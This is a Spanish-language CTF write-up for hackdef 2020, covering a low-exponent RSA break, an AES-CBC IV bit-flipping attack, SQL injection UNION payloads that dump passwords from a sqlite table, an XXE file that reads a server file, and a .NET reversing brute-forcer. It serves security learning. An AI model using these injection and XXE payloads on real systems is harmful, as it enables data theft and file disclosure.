@@ -1,0 +1,237 @@
+Writeups hackdef 2020:
+Crypto: 2.RSA y 3.fl1pp3r
+Web: 1.Filtrado y 3.Exfil
+Reversing: 3.Deviation
+############################
+Crypto
+2. RSA
+Para este reto se nos proporcionó la llave pública y la bandera cifrada, además del algoritmo con el que se cifro, 
+es decir, RSA.
+Primero se vieron los valores asociados a la llave publica, es decir, el módulo n y el exponente, donde notamos que el exponente
+tenía un valor diferente al que comunmente se maneja, es decir, diferente al 65537, pues el exponente de esta llave es 17.
+Al principio intentamos ataques de fuerza bruta para obtener el par de numeros primos que nos permitieron romperlo a partir
+de los valores leídos en la llave pública. Sin embargo, luego de un buen rato no hubo resultados.
+Posteriormente se publicó una pista que indicaba que el exponente era muy bajo, por lo tanto se trataba de un ataque RSA con
+exponente bajo.
+Fue con esto que se llegó a las formulas que describen la forma en que el cifrado RSA funciona.
+El cifrado RSA consiste en elevar un bloque de texto en claro "p" a un módulo "e" con operación módulo mod de "n".
+De forma simbolica: c = p^e (mod n)
+Si se supone que p^e < n es posible recuperar el texto en claro calculando la raíz e de c:
+    p = raíz e de c  dada la condición anterior (p^e < n)
+Por otro lado, si p^e >= n entonces es necesario sumar enteros múltiplos de n a hasta que se encuentre 
+una raíz exacta de esta suma. Es decir:
+    p = raíz e de (c + k*n) donde k debe ser un entero
+A partir de estas fórmulas es posible aprovecharse de los exponentes bajos de RSA y al implementarlas en un script 
+de python, utilizando dos métodos de dos módulos (gmpy2 y Crypto.PublicKey) se logró obtener la bandera ya que
+se realiza el cálculo rápidamente.
+El script implementado fue el siguiente 'rsa_break.py':
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+from gmpy2 import iroot # modulo para precision de calculos aritmeticos
+from Crypto.PublicKey import RSA  # modulo para leer valores de una llave publica
+
+with open('llave_publica.pem', 'r') as llave_publica:
+    key = RSA.importKey(llave_publica)  # objeto que nos permite obtener los valores de la llave publica
+
+with open('bandera_enc.txt', 'r') as bandera:
+    c = bandera.read().encode('hex')  # mensaje cifrado en formato hexadecimal
+
+n = key.n  # modulo n
+e = key.e  # exponente e
+c = int(c, 16)  # se pasa mensaje cifrado a entero hexadecimal
+k = 0  # contempla p^e < n
+while True:
+    print "k: {}".format(k)
+    p, correct = iroot(c + k*n, e)  # p = raiz e de (c + k*n)  # correct: indica si la raiz es exacta o no
+    print "plain_int_hex: {}".format(p)
+    print "correct: {}".format(correct)
+    if correct:
+        mensaje = '{:x}'.format(int(p)).decode('hex')  # mensaje = se convierte p (mpz) a entero en hexadecimal y se decodifica
+        print 'mensaje: {}'.format(mensaje)
+        exit()
+    k+=1  # contempla cuando p^e >= n
+La bandera del reto fue: hackdef{S13mpr3_m4n3j4r_3xp0n3nt3s_4lt0s}
+####################################################################################################################################################
+3. fl1pp3r
+Primero se analizó el script flipper.py y se entendió como se generaba el token. 
+El token válido siempre se creaba cuando se realizaba la conexión al puerto y no era posible contar con uno previo (como nos quería hacer creer el script).
+Entonces, conociendo la llave de inicialización "AAAAAAAAAAAAAAAA" y el mensaje que nos devolvía "flipid=[0-4]", podíamos intentar generar token válidos (ya que teníamos el 
+código fuente), pero era necesario conocer el key aleatorio que se creaba cuando nos conectabamos al cliente. Esto no era viable por el numero de key posibles que debiamos de generar.
+Sin embargo, partiendo de la misma idea y viendo los elementos que conocíamos (token), los que no podíamos modificar (key) y los que podíamos manipular (IV) además de conocer
+el tipo de cifrado aplicado (AES modo CBC) y con el nombre del script "flipper.py", fue posible explotar la vulnerabilidad que consiste en 
+ modificar los bits del IV para que al realizar el XOR con el bloque cifrado nos muestre una salida diferente en el texto
+descifrado.
+Lo anterior se conoce como bit-flipping attack y fue posible aplicarlo para cambiar el mensaje que el token nos generaba "flipid=[0-5]".
+Para lograrlo se considera la longitud del IV que es de 16 bytes "AAAAAAAAAAAAAAAA" y la cadena "flipid=n" se rellena con padding, es decir, 
+el mensaje pasa a ser de 16 bytes "flipid=n\x08\x08\x08\x08\x08\x08\x08\x08" donde n es un numero del 0 al 4.
+El objetivo es entonces cambiar n por un 6 para que nos hagamos pasar como el administrador y obtengamos la bandera.
+Como se observó, la n se encuentra en la posición 7 (si comenzamos la cuenta de posiciones desde 0) y haciendo uso del bit-flipping
+debemos cambiar el caracter en la posición 7 de la llave de inicialización hasta que obtengamos en el mensaje descifrado: "flipid=6"
+Se escribió un pequeño script en python2 para generar todas las posibles IV cambiando la IV[7] por una letra de la A-Z.
+El script 'generate_iv.py' contiene lo siguiente:
+#!/usr/bin/python
+import string
+for c in string.ascii_uppercase:
+    print 'A'*7 + c + 'A'*8
+
+Esto nos devuelve todas las cadenas con el IV[7] modificado y lo último que realizamos para obtener la bandera fue
+conectarnos nuevamente al puerto, meter el token que nos daba el programa y probar con cada uno de los IV que nos arrojó
+el script hasta que nos devolvió la bandera.
+En nuestro caso la cadena de llave de iniciacialización que lo logró fue: "AAAAAAACAAAAAAAA"
+La bandera del reto fue: hackdef{_nunC4_dej3s_3l_c0ntR0l_d3l_IV_a_uN_usuAr10_qU3_3nt1end3_3L_m0d0_d3_op3r4ci0n_CBC_}
+
+####################################################################################################################################################################
+Web:
+1. Filtrado
+Para este reto primero se observo que había un campo de entrada (donde se ponia una dirección de correo electrónico) y nos indicaba si su contraseña se había filtrado.
+Eso indicaba que se hacía una consulta a una base de datos y el titulo de la página nos daba otra pista "--pwned;" lo que indicaba un posible SQLi.
+Se probó con entradas incompletas y comunes para generar errores de consultas de SQL.
+Con la entrada: carlosmora@mail.com' nos arrojó el error que confirmba la vulnerabildiad a SQLi y nos indicaba que se trataba de sqlite.
+Al tratarse de sqlite se realizan las consultas para obtener el nombre de la tabla y la columna vulnerable. Las consultas realizadas y con las que se obtuvo la bandera
+fueron:
+carlosmora@mail.com' or '1'='1
+Al ser sqlite en ruby, faltaba el )
+carlosmora@gmail.com') union select null,null,null,null,null from sqlite_master--"
+carlosmora@gmail.com') union select null,null,null,null,name from sqlite_master--"
+
+Aquí entró de nuevo la pista del título: pwned?;-- que nos indicaba que no se requerían las comillas finales y comenzamos a realizar las consultas 
+sin ellas y obtener más resultados además de continuar con el operador union.
+
+carlosmora@gmail.com') union select null,sql,null,null,null FROM sqlite_master WHERE type='table'--
+Nos devolvió: CREATE TABLE "accounts" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "email" varchar, "password" varchar, "leakedfrom" varchar, "date" datetime)
+
+carlosmora@gmail.com') union select null,password,null,null,null FROM accounts--
+Nos devolvió: #goy@goy@!
+
+carlosmora@gmail.com') union select null,id,null,null,null FROM accounts--
+Nos devolvió: 1
+
+Ya que podíamos obtener los valores de la tabla objetivo y conociendo el correo del usuario vulnerado, hicimos la consulta para obtner la
+contraseña del usuario carlosmora@mail.com mediante la siguiente consulta:
+carlosmora@gmail.com') union select null,password,null,null,null FROM accounts where email='carlosmora@mail.com'--
+Nos devolvió la bandera: hackdef{sql_1nj3ct10n_3v3rywh3re!}
+
+############################################################################################################################################
+3. Exfil
+Para este reto vimos que el sitio nos permitía subir una lista de contactos en formato XML, por lo que se buscó una vulnerabilidad asociada 
+a XML, que fue XXE (XML External Entity) porque nos permite explotar la forma en que se parsea el archivo XML y utilizar las external entities 
+para obtener el contenido de un archivo del sistema (debido a que en la descripción se indica que la bandera está en 
+/app/app/flag.txt).
+Por lo tanto, una vez que supimos esto, generamos un archivo XML (siguiendo el formato que se nos indicaba en el reto)
+donde explotamos la vulnerabildiad XXE y obtenemos el contenido del archivo /app/app/flag.txt mediante las external entities:
+El archivo xml cargado fue:
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ 
+        <!ELEMENT foo ANY>
+        <!ENTITY bar SYSTEM "file:///app/app/flag.txt"> ]>
+<directorio>
+        <contacto>
+                <nombre>&bar;</nombre>
+                <telefono>###-###-####</telefono>
+        </contacto>
+        <contacto>
+                <nombre>aa</nombre>
+                <telefono>###-###-####</telefono>
+        </contacto>
+</directorio>
+Al subir un archivo como el anterior nos devolvió la bandera:
+hackdef{d0_n0t_tru5t_xml_f1l3s}
+
+############################################################################################################################################
+Reversing:
+3. Deviation
+Para este reto se nos proporciona un ejecutable para windows, por lo que al ejecutar el comando file nos indica que 
+es un programa .NET.
+Al ejecutar el programa nos saluda e imprime una cadena "AWOP WOP WOP!!!! Nooooooo00000oooo!" porque no se presiona la combianción 
+correcta de teclas.
+Entonces, se nos proporcionó el hint de dnSpy con el que pudimos decompilar el ejecutable y obtener el código del programa.
+En el código fuente observamos que al presionar las teclas F5,F3 y F6 se llama a la clase Flag que recibe como argumento el nombre del usuario del entorno (Environment.UserName)
+y se muestra en salida estándar la bandera del reto (que debía estar en la clase Flag para un usuario específico).
+Por lo que era necesario cambiar el usuario para poder obtener la bandera. Para hacer esto revisamos el código fuente de la clase
+Flag y en el método l donde con la excepción correcta se forma la cadena de la bandera del reto (que empieza con hackdef{).
+Es entonces que dentro de este método, se forma la cadena de la bandera con el nombre de usuario (que debe ser de 8 bytes) y se utiliza la variable 
+array2 (es la cadena de e [excepción] -> "Index was outside the bounds of the array.").
+A partir de este método fue posible ver que era necesario generar el usuario para obtener la bandera y para ello hicimos un script 
+que lo que hace es (mediante fuerza bruta) pedirnos a la entrada el caracter correspondiente a "hackdef{" para devolvernos el usuario necesario de 8 bytes que nos
+devolverá la bandera del reto. El código fuente de nuestro script 'decoder.cs' es:
+
+using System;
+class HelloWorld {
+  static void Main() {
+     string message = "Index was outside the bounds of the array.";
+			string s = "";
+			Console.WriteLine(s);
+			
+				long num = 137438953472L;
+				int[] array = new int[]
+				{
+					-47,
+					-86,
+					-107,
+					-101,
+					-83,
+					-41,
+					-80,
+					-82,
+					13,
+					9,
+					-22,
+					-82,
+					-68,
+					-81,
+					-91,
+					-49,
+					-80,
+					-80,
+					-71,
+					-87,
+					-30,
+					0,
+					-36,
+					-97,
+					-12,
+					-61,
+					-101,
+					-67,
+					-94,
+					-75,
+					-26,
+					-15
+				};
+				char[] array2 = message.ToCharArray();
+				//char[] array3 = text.ToCharArray();
+				int contador_h = 0;
+				string a = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!";
+				char[] pruebas = a.ToCharArray();
+				char res = 'a';
+				char esp = 'h';
+				while (((long)s.Length & num) == 0L)
+				{
+					for(int i = 0 ; i < 53 ; i++){
+						byte b = Convert.ToByte(array2[s.Length]);
+						b ^= (byte)((int)Convert.ToByte(pruebas[i]) + array[s.Length]);
+						
+						res = Convert.ToChar(b);
+						if(res == esp){
+						    Console.WriteLine("Prueba -> caracter " + pruebas[i] +  "  Res: " + res);
+						    Console.WriteLine("Ingresa el siguiente caracter");
+						    esp = Console.ReadLine().ToCharArray()[0];
+						    break;
+						}
+						
+
+					}
+					s += res.ToString();
+					//Console.ReadLine();
+					num >>= 1;
+				}
+  }
+}
+Esto hace un readline para obtener el siguiente caracter a descifrar, por lo que a la entrada por cada iteración ponemos:
+h a c k d e f { -> y nos devolvió el usuario: P e r s o n a l
+Por lo tanto, al ejecutar nuevamente con este usuario (en lugar del de entorno) nos devolvió la bandera:
+hackdef{.N3T_no_e5_t4N_d1FiC1L!}
+
+##############################################################################################################################################
+
